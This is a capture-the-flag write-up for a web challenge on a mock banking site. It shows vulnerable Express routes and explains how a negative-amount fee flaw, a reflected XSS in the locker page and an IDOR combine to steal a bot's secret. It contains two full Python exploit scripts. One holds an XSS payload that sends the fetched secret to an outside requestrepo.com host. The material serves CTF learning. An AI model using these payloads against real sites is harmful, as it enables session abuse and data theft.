---
title: "A Very Safe Locker For Real Now"
categories: "Web Exploitation"
authors: moha09
tags: 
draft: false
completedDuringEvent: true
submitted: true
points: 420
solves: 16
flags: flag{RANDOM_EACH_INSTANCE?}
---

> We upped our security since last year, and now our lockers are more exclusive than ever! The only thing we couldn't quite work around is the master's authority, can you get yourself a locker and trick him into giving you the secret flag? We have patched the unintended. Find the vulnerable source code from 'A Very Safe Locker Indeed' (with the unintended). Show me how you solve it now.

---

Okay continue from [A Very Safe Locker Indeed](../a-very-secret-locker-indeed/README.md), we have the source code of the previous challenge. However, this time we cannot use the previous NoSQL injection technique to read the confidential file since the injection vector has been patched.

So there is master endpoint where will call the bot service to deposit money into our locker. The bot service will read the `userMessage` parameter and put it into the locker page.

```js filename=src/app/routes/master.js
router.post('/master', async (req, res) => {
  if (!req.user) {
    return res.redirect('/login')
  }

  const { email, amount, userMessage } = req.body

  axios
    .post('http://bot', { email, amount, userMessage })
    .then((response) => {
      data = response.data

      return res.render('master', {
        user: req.user,
        clientEmail: email,
        successMessage: data.success
          ? 'You bank master has successfully deposited the amount in your locker.'
          : false,
        failMessage: !data.success
          ? 'Something went wrong while the bank master was depositing your amount, please try again later.'
          : false,
      })
    })
    .catch((error) => {
      return res.status(404).send('An unexpected error occured')
    })
})
```

Let's check the locker route how the `userMessage` parameter is used.

```js filename=src/app/routes/locker.js
router.get('/locker', async (req, res) => {
  if (!req.user) {
    return res.redirect('/login')
  }

  const userId = req.user.id
  const user = await User.findById(userId)

  if (user.isMaster) {
    const client = await User.findOne({ masterId: userId })

    if (client.mainBalance < 1_000_000_000_000) {
      return res.render('locker', {
        unauthorized: true,
        user: req.user,
      })
    }

    const userMessage = req.query.userMessage || ''

    res.render('locker', {
      lockerBalance: client.lockerBalance,
      user: req.user,
      isMaster: true,
      nonce: req.nonce,
      userMessage: userMessage
        .replace(/"/g, '\\"')
        .replace(/'/g, "\\'")
        .replace(/\n/g, '\\n')
        .replace(/>/g, '&gt;')
        .replace(/</g, '&lt;'),
    })
  } else if (user.mainBalance < 1_000_000_000_000) {
    return res.render('locker', {
      unauthorized: true,
      user: req.user,
    })
  } else {
    res.render('locker', {
      lockerBalance: user.lockerBalance,
      user: req.user,
    })
  }
})
```

In the locker route, we can see that if the user is a master and his client has more than 1 trillion in the main balance, the `userMessage` parameter will be reflected in the locker page without proper sanitization (only replacing some characters). So we can try to inject an XSS payload here.

But wait, how can we have more than 1 trillion in our main balance? Let's check the transaction route.

```js filename=src/app/routes/transcations.js
router.post('/transfer', async (req, res) => {
  if (!req.user) {
    return res.redirect('/login')
  }

  let { receiverInfo, amount } = req.body
  amount = parseFloat(amount)

  if (!receiverInfo || amount == undefined) {
    return res.status(500).send('An error occured, please try again later.')
  }

  const user_from = await User.findById(req.user.id)

  if (isNaN(amount) || !Number.isFinite(amount)) {
    return res.render('index', {
      user: req.user,
      balance: user_from.mainBalance,
      failMessage: 'Please enter a valid amount to transfer.',
    })
  }

  let user_to = {}

  try {
    if (!receiverInfo.includes('@') && receiverInfo.trim().length == 24) {
      user_to = await User.findOne({ _id: receiverInfo })
    } else {
      user_to = await User.findOne({ email: receiverInfo })
    }
  } catch (error) {
    return res
      .status(500)
      .send('An error occurred while searching for the recipient.')
  }

  if (!user_to) {
    const fee_proportion = 100 * (amount / user_from.mainBalance) // Fee is proportional to the amount attempted to be sent
    user_from.mainBalance -= fee_proportion
    await user_from.save()

    return res.render('index', {
      user: req.user,
      balance: user_from.mainBalance,
      failMessage:
        'Failed to find the recipient user, a percentage fee has been applied to your account for this failed transaction.',
    })
  }

  if (user_to._id.toString() === req.user.id) {
    return res.render('index', {
      user: req.user,
      balance: user_from.mainBalance,
      failMessage: 'You cannot transfer funds to yourself.',
    })
  }

  const transaction_amount = parseFloat(amount) * 1.01 // Include 1% fee
  if (user_from.mainBalance >= transaction_amount && transaction_amount > 0) {
    user_from.mainBalance -= transaction_amount
    await user_from.save()
  } else {
    return res.render('index', {
      user: req.user,
      balance: user_from.mainBalance,
      failMessage: 'Insufficient balance to cover the transfer and fees.',
    })
  }

  user_to.mainBalance += parseFloat(amount)
  await user_to.save()

  const transaction = new Transaction({
    user_from: req.user.id,
    user_to: user_to._id,
    type: 'transfer',
    amount: transaction_amount,
  })
  await transaction.save()

  return res.render('index', {
    user: req.user,
    balance: user_from.mainBalance,
    successMessage:
      'Transfer successful go to <a href="/transactions">Transactions</a> to view details.',
  })
})
```

Here we can see that if we try to transfer a negative amount to a non-existing user, we will be charged a fee proportional to the amount attempted to be sent. So if we try to transfer a very large negative amount since the logic is subtracting the fee from our main balance without checking if the amount is negative.

```js
if (!user_to) {
  const fee_proportion = 100 * (amount / user_from.mainBalance) // Fee is proportional to the amount attempted to be sent
  user_from.mainBalance -= fee_proportion
  await user_from.save()

  return res.render('index', {
    user: req.user,
    balance: user_from.mainBalance,
    failMessage:
      'Failed to find the recipient user, a percentage fee has been applied to your account for this failed transaction.',
  })
}
```

So we can combine these two vulnerabilities to get the flag. First, we register a new user and login. Then we transfer a very large negative amount to a non-existing user to get infinite balance. After that, we call the master endpoint to inject our XSS payload in the locker page. The payload will fetch the confidential file and exfiltrate it by redirecting the document location to our controlled server.

Here is the complete exploit script:

```py
import requests

URL = 'https://{INSTANCE}.chal.ctf.ae'

res = requests.post(f'{URL}/register', data={
    'firstName': 'ztz',
    'lastName': 'ztz',
    'phoneNumber': '1234567890',
    'email': 'ztz@ztz',
    'password': 'ztz'
})
print(res.text)

s = requests.Session()
s.post(f'{URL}/login', data={
    'email': 'ztz@ztz',
    'password': 'ztz'
})

s.post(f'{URL}/transfer', data={
    'receiverInfo': 'ztz@invalid',
    'amount': '-99999999999999999999'
})

res = s.post(f'{URL}/master', data={
    'email': 'ztz@ztz',
    'amount': '1',
    'userMessage': '\\"}`+fetch(`/master/confedential`).then(function(text){text.text().then(function(text){document.location=(`https://jie2874c.requestrepo.com?text=`+btoa(JSON.stringify(text)))})})/**/`'
}, timeout=15)
print(res.text)
```

## Other Exfiltration Methods

We can use other method rather than redirecting the document location to exfiltrate the flag. We can store the flag `firstName` or `lastName` of the registration user or in the search autocomplete history by making a fetch request to `/transactions/search?searchTerm=${flag}`.

Intended solution from the author:

```py
import uuid
import httpx
import re
import time

# Configurations and Initial Setup

url = "http://localhost:54763"
flag_format_prefix = "flag"

name = uuid.uuid4().hex
password = uuid.uuid4().hex
email = f"{name}@example.com"
phone = "1234567890"

bankmaster_email = f"{email}.bankmaster"

timeout = httpx.Timeout(10.0, read=30.0) # We will need the timeout later for waiting on XSS payload execution
session = httpx.Client(timeout=timeout)

r = session.post(f"{url}/register", data={"firstName": name, "lastName": name, "email": email, "phoneNumber": phone, "password": password, })

if r.status_code in [200, 302]:
  print("[+] Registered successfully with email {} and password {}".format(email, password))
else:
  print("[-] Registration failed")
  exit(1)


# Vuln 1: Business Logic Flaw to obtain an Infinite balance

# Step 1: Setting balance to zero by transferring calculated amount to bankmaster

initial_balance = 10
fees = 0.01

zero_fee_transfer_amount = initial_balance / (1 + fees)

r = session.post(f"{url}/transfer", data={"receiverInfo": bankmaster_email, "amount": zero_fee_transfer_amount })

zero_balance_check = re.search(r"\$0", r.text)

if r.status_code == 200 and zero_balance_check is not None:
  print("[+] Transferred {} to bankmaster to obtain zero balance".format(zero_fee_transfer_amount))
else:
  print("[-] Transfer failed")
  exit(1)

# Step 2: Exploiting the failed transfer fee flaw to add infinite balance

r = session.post(f"{url}/transfer", data={"receiverInfo": uuid.uuid4().hex, "amount": -1 }) # Transfer negative amount to a non existent account to trigger fee addition

infinite_balance_check = re.search(r"\$Infinity", r.text)

if r.status_code == 200 and infinite_balance_check is not None:
  print("[+] Obtained infinite balance successfully")
else:
  print("[-] Could not obtain infinite balance")
  exit(1)


# Vuln 2: Exploiting XSS to leak the bankmaster's flag into search autocomplete history

xss_payload = 'xyz\\\"}`;fetch(`/master/confedential`).then(function(resp) {return resp.text()}).then(function(flag) { fetch(`/transactions/search?searchTerm=${flag}`)});`'

print("[+] Waiting for XSS payload to execute...")
r = session.post(f"{url}/master", data={"email": email, "amount": 10, "userMessage": xss_payload })

if r.status_code == 200:
  print("[+] XSS payload injected successfully. Moving on to exfiltration.")
else:
  print("[-] XSS payload injection failed")
  exit(1)

# Vuln 3: Exfiltrating the flag via IDOR in /api/search-history/autocomplete

# Step 1: Retrieving bankmaster user ID

r = session.get(f"{url}/transactions")

bankmaster_id_search = re.search(r"([a-f0-9]{24})<br>\(" + name + r"\s+" + name + r"'s Bank Master\)", r.text)


if bankmaster_id_search is not None:
  bankmaster_id = bankmaster_id_search.group(1)
  print("[+] Retrieved bankmaster user ID: {}".format(bankmaster_id))
else:
  print("[-] Could not retrieve bankmaster user ID")
  exit(1)

# Step 2: Change lastname to exploit IDOR

forged_lastname = "{}'s Bank Master's Bank Master".format(name)

r = session.post(f"{url}/profile", data={"firstName": name, "lastName": forged_lastname, "email": email, "phoneNumber": phone })

if r.status_code == 200:
  print("[+] Changed last name to \"{}\" to assume bankmaster identity".format(forged_lastname))
else:
  print("[-] Could not change last name")
  exit(1)

# Step 3: Access search autocomplete history to retrieve flag

r = session.get(f"{url}/api/search-history/autocomplete/{bankmaster_id}")

flag_search = re.search(r"{}{{.*?}}".format(flag_format_prefix), r.text)

if flag_search is not None:
  print("[+] Retrieved flag: {}".format(flag_search.group(0)))
else:
  print("[-] Could not retrieve flag")
  exit(1)
```
